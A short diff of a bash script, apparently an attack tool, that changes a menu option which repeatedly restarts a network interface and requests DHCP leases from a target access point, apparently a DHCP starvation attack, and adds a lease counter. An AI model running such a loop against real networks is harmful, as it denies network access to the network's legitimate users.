@@ -174,7 +174,8 @@ if [ $ask -eq 4 ]
 fi
 if [ $ask -eq 5 ]
 	then 
-		online=1
+		cnt=0
+    online=1
 		echo "To successfully perform this attack you must be connected to the destination AP!"
 		echo "Your Hostname is:"
 		hostname
@@ -192,6 +193,9 @@ if [ $ask -eq 5 ]
 				sudo ifconfig $inter up 
 				sleep 4
 				sudo dhclient $inter
+				((cnt++))
+				clear
+				echo $cnt "DHCP leases gathered"
 				sleep 2
 				#check online start 
 				ping -c 1 $gate > /dev/null
